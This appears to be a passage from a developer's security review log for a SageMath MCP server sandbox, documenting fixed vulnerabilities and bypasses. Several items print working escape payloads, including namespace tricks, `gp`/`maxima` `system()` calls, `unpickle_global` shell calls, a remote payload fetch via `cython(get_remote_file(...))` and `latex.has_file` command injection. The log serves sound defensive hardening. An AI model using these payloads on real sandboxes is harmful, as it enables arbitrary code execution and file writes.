computation", which is both safe and true. Covered from both directions: idle
returns False and the session stays usable; a real in-flight computation is
signalled, returns `Interrupted`, and its variables survive.

---

## 20. Large integer results are silently corrupted in JS clients — high — DONE

Found by the extended CLI suite, which had never been run against the split
branch and is not run by CI. Claude answered `bell(30)` as
`846749014511809388871680`; the correct value is `846749014511809332450147`.

### What was wrong

Item 12 fixed integers coming *in*: above 2^53 a JSON number is no longer exact,
so those parameters must arrive as decimal strings. Results going *out* were
still emitted as JSON numbers, and a JavaScript-based MCP client parses every
number as an IEEE double. The server sent the exact value and the client rounded
it. Nothing errored, and the wrong number was displayed as the answer -- the
worst way for this to fail, because there is nothing for a caller to notice.

Confirmed server-side: the tool returned `846749014511809332450147`, and
`int(float(...))` of that is `846749014511809388871680`.

### Fix

`_exactify_large_ints` renders any integer beyond 2^53 as a decimal string, and
recurses into lists and dicts so factorisations, bases and varieties are covered
too. Applied at the single point where every specialized tool returns its result
(`_evaluate_structured`), so no tool can miss it. Integers below the boundary
keep their numeric type, so ordinary results are unchanged. `bool` is excluded --
it is an `int` subclass and would otherwise become `"True"`.

This is a **user-visible output contract change**, documented in the README and
the changelog. It mirrors the input side, which has spoken decimal strings for
the same values since 0.4.0.

### Verification

Unit tests for the helper including the container and type-preservation cases,
the item-12 test updated to assert the string, and four values checked against
real SageMath and round-tripped through JSON: `bell(30)`, `factorial(25)`,
`next_prime(10^30)` exact; `binomial(10,3)` still the integer `120`. The CLI case
that found it now passes.

---

## 21-23. Findings from the persistence/availability review — DONE

Seven findings, four rated P1. Each was reproduced before being fixed.

**21. Journal replay could not restore specialized-tool state.** Helper tools run
with `trusted=True` because their templates are built on `sage_eval`, but the
journal stored bare code and replay always used the caller policy. The first
specialized entry was rejected, replay stopped there, and the next save wrote
back only the replayed prefix -- persisted state quietly truncated and
unrestorable. Entries now record the trust mode they ran under and replay under
it; blessing every entry would have put caller code on the trusted path, which is
the one thing the policy split exists to prevent. Journals written before this
are plain strings and read as untrusted, which is both the safe reading and the
accurate one.

**22a. Exact-integer inputs.** `combinatorics_operation` (`n`, `k`) and
`elliptic_curve_operation` (`coefficients`) never called `_exact_int`, so
`binomial(9007199254740993, 2)` computed a plausible wrong answer from the
rounded value. Both now accept decimal strings and refuse numbers past 2^53, as
`number_theory_operation` has since 0.4.0.

**22b. `/health` was never registered.** The old code hunted for a Starlette app
on the FastMCP object and inserted a `Route`; under FastMCP 3.x `http_app` is a
bound method that *builds* the app, so the guard never matched -- inside a bare
`except: pass`, so it failed in silence while the README advertised the endpoint
and the Helm chart probed it. Now registered via `custom_route`, idempotently,
and asserted against the app FastMCP actually builds. The previous test passed
because it asserted against a mock with a `.routes` list.

**22c. `is_convex` returned true for concave input.** `Polyhedron(vertices=...)`
builds the convex hull, discarding the ordering that makes a polygon concave, and
`is_compact()` is true for every bounded polytope. It now walks the given
ordering and checks that every turn goes the same way.

**23a. The nightly handed all three provider keys to each leg.** A compromised
CLI -- or any npm dependency of one -- could read credentials for services it has
no business touching. Each leg now sees only its own.

**23b. The nightly stayed green when registration failed.** `run_extended`
catches the `CalledProcessError` from `mcp add`, so a changed CLI syntax printed
"0/0 passed" and exited 0: green precisely when the CLI could not reach the
server. A selected CLI that runs no cases now fails. Absent credentials remain a
skip, not a failure -- those legs never start the runner.

**Also, an unbounded queue.** The stdout pump gives the read loop no backpressure
by design, so output produced faster than a slow callback consumed it grew
without limit until the process died. Bounded at 1000 lines, dropping oldest;
the complete stdout still travels with the result, so nothing is lost that a
caller cannot recover.

---

## 24. Forbidden functions reachable through attribute chains — **critical** — DONE

The name rules inspected bare `ast.Name` nodes and `ast.Call.func`. `sage` is an
allowed import root and none of its segments are forbidden, so the same function
sat one dot further along:

    sage.misc.sage_eval.sage_eval("__import__('os').getuid()")   -> 1001
    sage.all.sage_eval("__import__('os').getuid()")              -> 1001

Item 18 again, by a different path: the payload is a string the validator never
parses. What is checked now is the final name, however it is spelled.

`load()` and `attach()` were on no list at all. They execute whatever path they
are given and `load()` accepts a URL, which makes that remote code execution from
an ordinary-looking name. Both are forbidden for callers; no generated template
uses either.

## 25. Sage's helpers and CAS interfaces execute code — **critical** — DONE

Found by pulling on the previous thread, and worse than it.

    cython(get_remote_file('https://.../payload.pyx'))   download, compile, run
    sh('id')                                             a shell
    gp('system("id > /tmp/x")')                          wrote the file
    maxima('system("id > /tmp/x")')                      wrote the file

The last two are arbitrary shell execution: both landed real files owned by the
container user. Sage's interfaces spawn the actual CAS programs, and those carry
their own `system()` escapes.

**Why the earlier fixes kept missing it.** Each was another name added to a
denylist covering a namespace 1,838 entries deep. That does not converge. The
worker now removes names by **provenance**: fifteen modules that compile, run
shells, download, pickle or touch arbitrary paths, plus everything
`sage.interfaces.all` exports -- Sage's own list, so an interface added by a
future release is covered without anyone remembering. 169 names.

The mathematics is untouched, which was the thing to verify: Gröbner bases,
factoring, number fields, permutation groups, elliptic-curve rank, integration,
solving and plotting all still work, because Sage reaches Singular and PARI
in-process and only the subprocess interfaces were removed.

**A regression I caused fixing it.** The first version read `__module__` off every
namespace entry, which resolves every lazy import: startup went from instant to
1.8s, the delay landed inside the caller's first evaluation, and two timeout
tests failed on CI. The names are a literal now, with a test that re-derives them
from the installed Sage so a version bump cannot silently reopen the hole.

**Standing caveat.** This is the fourth bypass class in a day. The specific holes
are closed and tested, but a denylist over a CAS namespace is structurally on the
back foot -- the container remains the boundary, as §3 says. An allowlist for
caller code is the durable answer if it is ever worth the investment.

## 26. Supply chain and exposure — medium — DONE

`uv lock --check` was failing: the lock still said 0.4.0 after the 0.5.0 release,
because the bump script never touched it. No vulnerable dependency -- pip-audit
against the locked set reports nothing known -- but CI installs with `uv pip
install -e .[dev]`, which ignores the lock, so the audit and the set a consumer
gets by `uv sync` were different things and neither the drift nor the lock was
checked anywhere. The bump script re-locks now, CI runs `uv lock --check`, and
the version-consistency test includes the lock so it fails offline in a
millisecond.

`docker-compose` published `8314:8314`, binding every interface. Local MCP servers
are unauthenticated by design and that is fine; what stood out is that every
other default here is loopback -- stdio transport, `--host 127.0.0.1`,
`ClusterIP` -- so the quickstart was the one place that disagreed. It publishes to
`127.0.0.1:8314`, with a test that fails if it widens.

---

## 27. Imports re-create everything the scrub removed — **critical** — DONE

The namespace scrub (item 25) takes the dangerous helpers out of the worker
namespace. A caller who imports the module gets a fresh copy, and `sage.*` was on
the import allowlist. Measured against real SageMath:

    from sage.misc.cython import compile_and_load as f
    f('print(1)')                                   compiled and loaded a module

    from sage.interfaces.gp import Gp as P
    P()('2+2')                                      spawned GP -> 4

    from sage.misc.persist import unpickle_global as f
    f('os', 'system')('id')                         ran a shell command -> 0

Aliasing hid the names from every later rule, so the gate has to be the import
itself. **Caller code can no longer import anything.** The allowlist was there for
the generated prelude (`from sage.all import *`) and the plot templates (`base64`,
`io`); it now belongs to `trusted_policy()` alone. Callers never needed it -- the
worker starts with Sage fully loaded, which is how every documented example is
written.

Sage's own sub-packages (`cython`, `persist`, `remote_file`, `interfaces`,
`repl`, …) also joined the forbidden attribute roots, because `sage` is bound in
the namespace and `sage.misc.persist.unpickle_global` needed no import at all.

**Contract change:** `import math` and `from sage.all import factorial` used to be
accepted from callers. They are not. The names are already there without them.

## 28. Object methods write arbitrary files — high — DONE

`.save()` was forbidden; `.dump()`, `.save_image()` and `.export_jmol()` were not,
and each wrote a real file. Chasing them one name at a time is the same losing
game as the namespace denylist, so persistence is matched by **prefix** --
`save*`, `dump*`, `export*` -- for caller code.

`trusted_policy()` clears that rule, because the plot templates render through
`.savefig(BytesIO)`. A blanket prefix rule would have taken all three plotting
tools with it, which is why the exemption is deliberate rather than incidental.

Worth keeping in proportion: under the shipped container these writes land in a
512 MB tmpfs on a read-only root filesystem, and `/workspace` is mounted
read-only. The boundary held. The capability was still unintended.

## 29. A timeout escaped as a bare TimeoutError — medium — DONE

`evaluate_sage` handled `CancelledError`, `SageEvaluationError` and
`SageProcessError`, but not `TimeoutError`: a timed-out evaluation propagated raw,
so monitoring recorded nothing and the client got an unstructured error instead of
the message.

It went unnoticed because the test covering it ran `import time; time.sleep(10)`.
Once callers lost imports that became a `SecurityViolation` -- also a `ToolError`,
so the test kept passing while testing nothing. Both paths now translate the
timeout, record the message (not the class name, which tells an operator nothing)
and the test uses a long pure-Sage computation.

## 30. A binding could authorize a name the allowlist withholds — medium — DONE

The allowlist trusts two things: names it lists, and names the caller's own code
binds. The second is deliberately an over-approximation — `_bound_names` collects
static targets and never asks whether the assignment runs, because short of
executing the code it cannot. So `if False: __builtins__ = 1` authorizes
`__builtins__`, and `except ValueError as __builtins__` does it without the code
ever naming the object.

That only matters for names live in the worker namespace but absent from the
allowlist. There are nine, all dunders — `__builtins__`, `__import__`,
`__build_class__`, `__loader__` and friends — and `__builtins__['__import__']
('os')` is a shell. Probed end to end against Sage 10.9: every route was refused,
because reading a dunder is blocked by its own rule regardless of what authorized
the name.

So it was defence in depth, not a hole. Fixed anyway, on both sides:

- `_bound_names` drops dunders, so a binding cannot authorize what a caller may
  not read. The allowlist stops resting on a rule enforced elsewhere.
- The drift test asserted `additions` over names filtered by `startswith("_")`,
  which is exactly why the gap was invisible. It now asserts the *shape* of the
  gap — everything live-but-not-allowlisted must be a dunder — so a future Sage
  putting an ordinary name there fails the test instead of quietly widening what
  a binding can reach.

Two things found while probing, both left as they are:

- `except ValueError as srange:` deletes `srange` at the end of the block, per
  Python's own semantics, so a preloaded Sage function is gone for the rest of
  that session. Self-inflicted, session-scoped, and no different in kind from
  `srange = 5` shadowing it.
- The committed allowlist still listed the twelve names from the modules added to
  `_DANGEROUS_SAGE_MODULES` (`lazy_import`, `save_session`, …) because it predated
  that change. Unreachable either way — they are scrubbed from the namespace and
  refused by name — but stale. `make allowlist` now regenerates through a temp
  file, and regeneration is idempotent.

## 31. Nothing tested that mathematics still works — medium — DONE

The allowlist inverted the default, and with it the failure mode. The security
suite could not catch the new one: every test in it asserts something is
*blocked*, so a policy that refused everything would pass all of them. Three
real regressions were already shipped and invisible.

`tests/test_math_coverage.py` covers the other direction in three layers, two of
which need no Sage and run in the fast job, because that is where allowlist
regressions come from:

- **Binding forms** (35 cases) — every way Python and Sage create a name, since
  a caller's own names bypass the allowlist and anything `_bound_names` misses
  becomes an unusable variable.
- **A mathematical corpus** (59 cases) — one per area this server advertises,
  asserted to evaluate at all, so a whole area going dark cannot pass unnoticed.
- **Allowlist reachability** — the names callers actually reach for, named by
  area so a failure says which area broke rather than "1 of 1913 missing", plus
  a size floor because a nearly-empty allowlist passes every security test.

Found and fixed:

- **`match` statements bound nothing.** Patterns bind through `MatchAs`,
  `MatchStar` and `MatchMapping.rest`, not `Name` nodes, so every variable in a
  match statement read as undefined for the rest of the session.
- **`function('f')` bound nothing.** Sage's spelling for declaring a symbolic
  function injects into the namespace exactly as `var()` does — verified against
  10.9 — but only `var` was special-cased. `f = function('f')` worked, the bare
  form did not, and the bare form is what the documentation shows.
- **The refusal message sent callers after a fix they cannot perform.** `y` is
  not predefined, in this server or in Sage itself, so `diff(x^2*y^3, x, y)` is
  ordinary mathematics that needs `var('y')`. Being told the name "needs to be
  added to the allowlist" is true and useless. Clients are models that retry on
  the message they are given; short lowercase names now get told to declare the
  symbol, longer ones still get the allowlist message.

The suite was then deepened, because "it evaluated without raising" is a weak
assertion -- this project has already shipped a silently wrong answer (integers
above 2^53 corrupted by JSON parsing) that every no-exception test passed. Three
layers were added:

- **Mathematical truths** (72 predicates Sage evaluates to `True`) replaced the
  no-exception corpus. Sage decides equality, so there are no brittle string
  comparisons: `expand((x^2-1).factor()) == x^2-1` and `M * M.inverse() ==
  identity_matrix(2)` are invariants, not printed output. `==` on symbolics
  builds an *equation* rather than deciding one, so the harness wraps the final
  line in `bool()`.
- **Equivalent spellings** (19 groups) assert agreement *between* spellings —
  `2^10`, `2**10`, `pow(2, 10)` — which catches a wrong answer without anyone
  having to know the right one in advance.
- **Preparser forms** (17) pin the ways Sage is not Python: `5/2` exact, `2^10`
  a power, `R.<t> = QQ[]` a generator declaration.

Two more real fixes came out of it, and one upstream limitation:

- **Uniformly indented code was refused.** A snippet lifted out of a markdown
  block arrives with four spaces on every line, and got a syntax error for its
  margin rather than its mathematics. `normalize_caller_code()` dedents before
  validation *and* before execution, so both see the same text. It cannot change
  a valid program: valid module-level code has no common indent to remove.
- **Layer 2 (bindings across calls)** was split, because `_bound_names`
  over-approximates by design and comprehension targets and function arguments
  are *supposed* to vanish. A caller reading one now provably gets Python's own
  NameError rather than a security refusal — the difference between "you made a
  mistake" and "the server withheld something", and the second sends them
  hunting a permission problem that does not exist.
- **`match` with numeric literal patterns is broken by SageMath itself.** The
  preparser rewrites `case 1:` to `case _sage_const_1:`, which Python reads as a
  name capture: "makes remaining patterns unreachable". Verified against plain
  `sage script.sage` on 10.9 — inherited, not introduced, and nothing to fix
  here. The test cases use patterns that survive the preparser.

Two probe results worth keeping: `y`/`z`/`t` are genuinely not predefined in
Sage either, so refusing them is correct rather than a regression — but the
*tool* prelude declares `x, y, z, t`, so `differentiate_expression("x^2*y^3")`
works where the equivalent `evaluate_sage` call does not. That inconsistency is
recorded, not fixed: closing it means either predefining three symbols the Sage
REPL does not, or making the tools stricter than they have been.

## 33. String-path attribute access defeated every attribute rule — critical — DONE

Codex asked whether a dead assignment could authorize a worker-global the
allowlist excluded. That specific path was already closed — the gap contains
only dunders, and there is a test asserting it — but the search list attached to
the question (`attrgetter|methodcaller|itemgetter|partial|reduce|operator`)
pointed at something worse, and it was live.

**Every attribute rule this server has is enforced on the AST**: the parent and
the attribute are both read out of the source. `operator.attrgetter` takes its
path as a *runtime string*, so none of that machinery applies. Sage binds 22
module objects including `sage` itself, so one string-path primitive reaches the
whole tree. Confirmed against 10.9, each of these ran:

| Payload | Result |
|---|---|
| `pari('system("id > /tmp/x")')` | **shell command executed**, file written |
| `operator.attrgetter("misc.persist.unpickle_global")(sage)` | returned the real function — arbitrary code execution |
| `operator.attrgetter("__builtins__")(warnings)` | the real builtins dict, and from there `__import__` |
| `operator.attrgetter("__class__.__base__.__subclasses__")(1)()` | the classic escape, invisible to the dunder rule |
| `operator.methodcaller("save", "/tmp/x")(matrix(...))` | **file written**, defeating the `save*` prefix rule |
| `oeis(45)` | network request from a sandbox with no network need |

Root cause is structural, and it is the same one as before: the allowlist is
generated as *whatever survives the namespace scrub*, so it inherits every gap
in that scrub. `operator` and `warnings` are stdlib modules with no Sage
provenance; `pari` is the PARI **library** interface, which the external-CAS
scrub missed because it comes from `sage.libs.pari` rather than
`sage.interfaces.all`.

Fixed on both sides. `attrgetter`, `methodcaller` and `itemgetter` are forbidden
call names, and `operator`, `warnings`, `pari` and `oeis` are forbidden
attribute parents, so the refusal happens before anything runs. The namespace
scrub drops those four plus the display and IO helpers that each demonstrated a
concrete capability — `install_doc`, `show`, `view`, `animate`, `html`, `latex`,
`search_src`, `search_doc`, `reference`, `Profiler`. The allowlist regenerated to
exactly −14 names, nothing else.

Worth being precise about why removing `operator` is the load-bearing part
rather than removing modules: **any** module object yields `__builtins__` through
a string path, so chasing modules one at a time was never going to work.
`getattr`, `setattr` and `vars` were already refused, which is what left
`operator` as the only remaining way in — verified by probing each primitive
individually rather than assumed.

Two things checked before trusting the removals: `latex` is imported from
`sage.all` inside `_latex()` rather than read from the caller namespace, so
LaTeX output is unaffected, and the plot tools render through
`.savefig(BytesIO)` rather than `show`. Both confirmed by the full suite — 763
tests against real Sage.

The undeclared-symbol heuristic was tightened in the same change: "short and
lowercase" also matched `pari`, `oeis` and `show`, so the server was advising
`var('pari')` for a name it had deliberately withheld. A symbol is now a single
letter with an optional index, or one of the Greek names Sage binds.

**These vectors exist in the released 0.5.0.** A 0.5.1 is not optional.

## 34. A dangerous-module entry that protected nothing — medium — DONE

Follow-up on item 33, from checking my own fix rather than a new report. The
`sage.libs.pari.all` entry added to `_DANGEROUS_SAGE_MODULES` removed **zero
names**. The derived set stayed at 198, identical to the baked list.

`_dangerous_sage_names` takes only names *defined* in a listed module -- it has
to, since `sage.misc.persist` also has `Integer` in scope and removing that
would break the mathematics -- and `pari`, `pari_gen` and `PariError` are every
one of them defined in `cypari2`. So the entry read like protection and was
none. What actually removed `pari` was the explicit `_DANGEROUS_BARE_NAMES`
entry, which is why the vector tested as closed.

This is the failure mode the repository keeps meeting: a check that silently
covers nothing while looking like it covers something. Fixed the same way as
the generated-code lint's discovery floor -- an integration test now fails on
any provenance entry that matches no names, so a dead entry cannot be added
silently again. `pari` moved to the bare-name list with the reasoning written
down beside it.

Two things checked while there, both clean:

- **`pari_gen` and `PariError` are still live and are inert.** `pari_gen()`
  refuses to instantiate ("PARI objects cannot be instantiated directly"),
  `.eval` is a forbidden function, and `__pari__` is a blocked dunder, so there
  is no route from a Sage object back to a PARI evaluator.
- **`SAGEMATH_MCP_STARTUP` cannot smuggle a name to callers.** A custom startup
  does bind whatever it likes in the namespace -- `import os as helper` works --
  but the allowlist is baked from the default namespace, so `helper` is refused
  as "not a name this server offers". It is operator-controlled configuration
  in any case, and anyone who can set it already owns the process. Worth
  recording as a property the allowlist now provides for free: before it, a
  custom startup was reachable by caller code.

## 35. Sage ships its own attrgetter, and it is not called attrgetter — critical — DONE

Item 33 blocked Python's `operator.attrgetter`/`methodcaller`. That was fixing the
instance, not the class: SageMath has its own string-path primitives, and three
were still offered. Each confirmed against 10.9, each writing a real file:

| Payload | Result |
|---|---|
| `attrcall('save', '/tmp/x')(matrix([[1,2],[3,4]]))` | **file written** |
| `raw_getattr(M, 'save')(M, '/tmp/x')` | **file written** |
| `getattr_debug(M, 'save')('/tmp/x')` | **file written** |
| `getattr_debug` chained through `__class__` → `__base__` → `__subclasses__()` | **reached the class list** |

`getattr_debug` is a complete `getattr` equivalent, so the classic traversal was
open through it. `raw_getattr` deliberately skips the descriptor protocol, so it
returns a descriptor rather than a class — but it resolves *methods*, which is
all a file write needs.

**Why name-by-name blocking kept missing these.** I scanned every allowlisted
callable for `getattr(` in its source. It found fourteen, none of them these:
**807 of the 1902 allowlisted names are compiled Cython with no readable
source**, and `attrcall` is one of them. A source scan cannot see this class.

Fixed by provenance instead — `sage.misc.call`, `sage.cpython.getattr` and
`sage.cpython.debug` are scrubbed wholesale, so a helper a future Sage adds to
any of them is gone on arrival. That immediately caught two more nobody had
named: `getattr_from_other_class` and `dir_with_other_class`. Ten names in
total, and the allowlist lost four of them (`attrcall`, `raw_getattr`,
`getattr_debug`, `type_debug`).

**A process defect underneath it.** Adding a module to `_DANGEROUS_SAGE_MODULES`
removed nothing, because the worker strips by a *baked* list and the derived one
is only compared to it by a test. The list is baked deliberately — deriving it at
startup resolves Sage's lazy imports and cost 1.8 s inside the caller's first
evaluation — but there was no tooling to rebuild it, so the instruction was
"regenerate" with no command. `make denylist` now does it
(`scripts/generate_denylist.py`, emit inside Sage and splice on the host, since
the container mounts the checkout read-only), and the drift test names the
command instead of the intention.

## 36. Objects from allowlisted factories escape the name check — low — DONE

**No working exploit, and saying so plainly matters more than the fix.** The
report pointed at `get_display_manager()`, which is allowlisted and hands back a
`DisplayManager` carrying `switch_backend` and `graphics_from_save` — the latter
taking a caller-supplied callable, and named so that the `save*` prefix rule
does not touch it. Probed against 10.9:

- `switch_backend` is inert: it requires a `BackendBase` **instance**, not a
  name, and no backend class is reachable (`BackendBase`, `BackendSimple`,
  `BackendIPython`, `get_backend`, `DisplayManager` are none of them allowlisted).
- `graphics_from_save` is a gadget with no ammunition. It invokes a callable the
  caller supplies with a temp path — but supplying a *dangerous* one means
  naming it, which the allowlist refuses, or reaching it by attribute, which the
  attribute rules refuse. `P.save` was blocked at the AST, as designed.

The general point behind it is real, though: **the allowlist governs names, and
an object's methods are governed only by the attribute rules.** Any factory
handing back a rich object is a route the name check cannot see. So the fix is
structural rather than specific — a test now sweeps every allowlisted zero-argument
factory, calls it, and fails if the result exposes a method matching a
capability word. It reports nothing today, which is the point: a future Sage
adding such a factory fails the suite instead of waiting to be probed.

Closed the subsystem anyway, since it costs nothing: `sage.repl.rich_output`'s
last two live names, `get_display_manager` and `pretty_print`, join `show` and
`view` — removed by provenance this time rather than by name, which also took
`DisplayManager`, `restricted_output` and five others. None has a purpose over
MCP, where results are strings and plots are base64 PNGs from the plot tools.
Verified afterwards that plotting and `want_latex` still work: the LaTeX path
imports `latex` from `sage.all` inside the worker rather than reading the
caller namespace.

Two things the sweep taught, both now handled: reading a `signature` or an
attribute **resolves a lazy import**, and some are broken in a given Sage —
10.9 raises `AttributeError` for `is_ProductProjectiveSpaces` during
`inspect.signature`, not at call time. And `version()` returns a `str`, whose
`removeprefix`/`removesuffix` match a capability word; it is filtered, and
exposing the Sage version is expected behaviour.

## 37. A binding authorized a name that already existed — high — DONE

Item 30 closed this for dunders and I recorded it as defence in depth, on the
strength of a measurement: everything live-but-not-allowlisted was a dunder. That
measurement was true only of the default startup, and the conclusion drawn from
it was too narrow. Reproduced against a worker started with a custom
`SAGEMATH_MCP_STARTUP` preloading `smuggled`:

```
smuggled()                                -> refused, correctly
leaked = smuggled(); smuggled = None      -> PRELOADED OBJECT EXECUTED
```

and split across two calls, with the binding in a statement that raised before
assigning anything:

```
call 1:  smuggled = 1/0                   -> ZeroDivisionError, binds nothing
call 2:  smuggled()                       -> PRELOADED OBJECT EXECUTED
```

`_bound_names` collects targets across the whole module and never asks whether
the assignment has run — it cannot, short of executing the code — so binding a
name at the end authorizes reading it at the start, while the name still holds
whatever was there before.

**The general rule, which is what item 30 should have been.** A caller's binding
authorizes a name the caller *creates*; it may not authorize one that already
exists holding something else. `validate_module` takes `withheld_names` and
refuses those whatever else authorizes them, and the worker passes everything
live-but-unoffered. Dunders fall out of the same rule rather than needing their
own.

**Severity in context.** `SAGEMATH_MCP_STARTUP` is operator configuration, so
this is not reachable by an untrusted caller on a default deployment, and an
operator who can set it already owns the process. What it broke is the invariant
this server documents — that a name is refused unless the allowlist offers it or
the caller's own code bound it — and the same hole opens with no custom startup
at all if a SageMath upgrade lands before `make allowlist` is rerun. That is a
realistic sequence, and it is why this is fixed rather than filed as
configuration.

One mistake worth recording: the first fix recomputed the withheld set from the
live namespace on every call, which swept up the caller's own variables — they
live in that same namespace, so `total` was withheld on the call after the one
that created it. Nineteen tests failed and said so. It is a snapshot taken once,
before any caller code runs.

## 38. A tool call reopened the scrubbed namespace — critical — DONE

Remote code execution, confirmed against SageMath 10.9. It wrote
`uid=1001(sage)` to disk. Three steps, and the middle one is **any specialised
tool at all**:

```
1.  if False: unpickle_global = 1                   # dead binding, authorized
2.  calculate_expression(...)  (or any tool)        # prelude re-imports sage.all
3.  unpickle_global('os', 'system')('id > /tmp/x')  # shell
```

The generated prelude runs `from sage.all import *` **in the same persistent
namespace as caller code**, which puts back every name the startup scrub had
removed. `unpickle_global` is guarded by that scrub alone — unlike `cython`,
`pari` or `attrcall`, which the AST rules refuse by name — so it came back fully
reachable. `show` did too.

This is the third distinct hole in one mechanism, and the progression is worth
reading as one thing. Item 30: a binding may not authorize a dunder. Item 37: a
binding may not authorize any name that already exists. Both fixes rested on a
snapshot of the namespace taken **at startup**, and this is what that assumption
was worth: a snapshot cannot cover names that appear afterwards, and trusted
code puts them there on every tool call.

Fixed by resealing rather than snapshotting once. `_reseal_namespace` re-applies
both scrubs and re-takes the withheld set after trusted execution, which is the
only thing that can repopulate — caller code cannot import. Caller-created names
are explicitly preserved, since a stateful session is the point of the server.

**Why the earlier probe missed it.** Item 34 tested `SAGEMATH_MCP_STARTUP` and
concluded the allowlist failed closed against a smuggled name. That was true and
irrelevant: the name in question was never smuggled in at startup, it was put
back by the server's own prelude on a later call. Testing the boundary at one
moment says nothing about a namespace that keeps changing.

## 39. The reseal ran on the success path only — critical — DONE

Item 38's fix, incomplete. Confirmed as remote code execution again, writing
`uid=1001(sage)`:

```
1.  if False: unpickle_global = 1     # dead binding
2.  a tool call whose generated code RAISES after its prelude
3.  unpickle_global('os', 'system')(...)   # shell
```

A tool's generated code runs its prelude **first** and the computation after,
so any tool call that fails has already repopulated the namespace by the time it
raises. I put the reseal after a successful return, which left every failing
call holding the door open — a singular matrix, an out-of-range bound, an
interrupted computation. Step 2 needs no special input, only a tool call that
does not succeed.

Moved into `finally`, which is the only construct that covers all three exits.
`KeyboardInterrupt` matters here specifically: it is a `BaseException`, so
cleanup written into `except Exception` would have missed the interrupt path,
which is exactly the path a caller controls by cancelling.

**The lesson, and it is about how I fixed the last one rather than about Sage.**
Item 38 identified the right mechanism and I placed the repair at the point
where I had *observed* the problem — a successful tool call — instead of at
every point the invariant could break. The regression test now parametrises all
three exits (returns, raises, interrupted) rather than the one that was
reported.

Also worth recording: the first version of this test passed while testing
nothing. Without Sage the worker records a startup error and returns before
executing anything, so `_build_namespace()` plus a trusted call did not run the
code at all. It builds a bare namespace and clears `_STARTUP_ERROR` instead, and
was confirmed to fail before the fix.

## 41. A caller could reserve a name for a tool to fill — low — DONE

Found by following where the review was looking rather than from a stated
finding. The reseal exempts caller-bound names from being withheld, so a
stateful session keeps working — and a caller can use that ordering:

```
if False: _fig = 1        # claim the template's internal, in dead code
plot_expression(...)      # the tool builds a matplotlib Figure under that name
_fig                      # <Figure size 640x480 with 1 Axes>
_buf.getvalue()[:4]       # b'\x89PNG'
_locals                   # {'x': x, 'y': y, 'z': z, 't': t}
```

**No capability came of it**, which is why this is low rather than critical.
`savefig` matches a forbidden prefix, `print_png` is absent on the base canvas,
and the PNG in `_buf` is the same image the tool returns anyway. But a
`matplotlib` Figure is a rich object and its being reachable is luck, not
design: the caller is holding something trusted code built.

The rule now: **whatever trusted execution introduces is withheld, whether or
not the caller claimed the name first.** The reseal takes the set of names that
appeared during trusted execution and drops them from the caller-bound set.
Diffing the namespace is sound used this way — to distrust what appeared, never
to trust it, which is what the original namespace-diff design got backwards and
what the comment at the top of the worker still warns about.

Checked in the same probe, and clean: `sage_eval` is refused by name even though
the prelude imports it on every tool call, and a second tool call still works
after the reseal has removed it, because the prelude re-imports it each time.

## 42. A key diff cannot see an overwrite — low — DONE

The hypothesis put to me was that caller names are recorded before execution, so
a *failed* caller request could reserve a name for trusted code to fill. Tested:
already closed — the failed assignment leaves no key, so the tool's assignment
counts as an arrival and item 41's diff catches it.

The neighbouring case was open, and it is the same defect in my own fix:

```
_fig = 5                  # the caller really creates it, successfully
plot_expression(...)      # the template assigns _fig = <Figure>
_fig                      # <Figure size 640x480 with 1 Axes>
_buf.getvalue()[:4]       # b'\x89PNG'
```

Item 41 withheld whatever *appeared* during trusted execution by diffing
namespace keys, and a key diff is blind to a name being replaced. So a caller
who created the name honestly kept the claim while the object under it became
the template's.

Fixed by reading the trusted code's own AST rather than diffing for this: every
name generated code binds is trusted-owned, whether the binding creates the name
or replaces one. The diff is kept **as well**, because `from sage.all import *`
binds names no AST walk enumerates — neither source is complete alone.

Severity is low for the same reason as item 41: nothing reachable through the
objects is a capability. What keeps being wrong is the ownership rule, and this
is the second time I have fixed it with the wrong instrument — first a snapshot
that could not see later arrivals, then a diff that could not see replacements.

## 47. Re-offering `latex` handed over a shell — critical — DONE

Remote code execution, live on `main` between 3fa5aa0 and this fix. It wrote
`uid=1001(sage)`:

```
latex.has_file('x; id > /tmp/KPSE_PROOF')     ->  uid=1001(sage)
latex.check_file('y; whoami > /tmp/...')      ->  sage
```

`Latex.has_file` runs `call("kpsewhich %s" % file_name, shell=True)` — the
caller's string, interpolated, `shell=True`. `check_file` and
`add_package_to_preamble_if_available` both call it.

`latex` had been scrubbed alongside `show`/`view`/`html` and was re-offered on
the reasoning that it builds a string and never wrote anything, with
`(x^2+1)._latex_()` allowed all along as proof the capability was not being
withheld. **That reasoning is right about the call and wrong about the object.**
`latex(obj)` does build a string; `latex` is a `Latex` instance, and allowlisting
a name hands over every method hanging off it. Same shape as items 36 and 40:
the allowlist governs names, and an object's methods escape it.

Two attempts, and the first was too broad. Refusing every attribute on `latex`
closed the shell and also refused **56 examples from SageMath's own doctests** —
`latex.extra_preamble(...)`, `latex.matrix_delimiters(...)`, which build strings
and set state. The corpus test caught it, which is exactly what it is for, and
is the first time an over-block of mine was caught by a test rather than by
someone trying to write a session.

The rule is the three methods by name, added to the existing
`forbidden_attribute_names`. That is name-chasing, which I have argued against
in these notes repeatedly, and the reason it is right here: **the capability is
the method, not the object.** `has_file` reaches a shell whoever holds it, so a
test asserts it is refused through an unrelated object too.

Kept working, and tested: `latex(x^2 + 1)`, `str(latex(matrix(...)))`,
`latex.extra_preamble()`, `latex.matrix_delimiters('[', ']')`.

## 48. The rule refused the call and permitted the reference — critical — DONE

Item 47's fix, incomplete, and my own regression. Confirmed against 10.9 — each
of these wrote `uid=1001(sage)`:

```
f = latex.has_file; f('x; id > /tmp/pwned')
[latex.has_file][0]('x; id > /tmp/pwned')
(lambda f=latex.has_file: f('x; id > /tmp/pwned'))()
```

The rule was enforced at the call site, `Call(func=Attribute(...))`, so binding
the bound method to a name and calling the name passed validation. **Reaching
the attribute is the capability; calling it is just what you do next.**

I had written the check on the attribute node and then deleted it as a
duplicate of the call-site rule while tidying. It was the broader of the two.
The lesson is narrow and worth keeping: when two rules overlap, the one to keep
is the one that fires earlier in the expression, not the one that reads more
specifically.

**Older and wider than `latex`.** `popen`, `rmtree` and the `spawn*` family have
been on `forbidden_attribute_names` far longer and were guarded the same
call-only way, so an alias reached them too. The regression test asserts the
alias forms through an unrelated object for exactly that reason.

Checked, because a reference-level rule is broader than a call-level one: the
doctest corpus still passes with no new over-block, so refusing the reference
costs none of SageMath's own documented mathematics.

SSH authentication to GitHub broke during this session (`ssh -T git@github.com`
returns `Permission denied (publickey)` with keys loaded). `gh` still works
because it uses token auth. If it persists, `git remote set-url origin https://…`
with `gh auth setup-git` routes git through the same token.

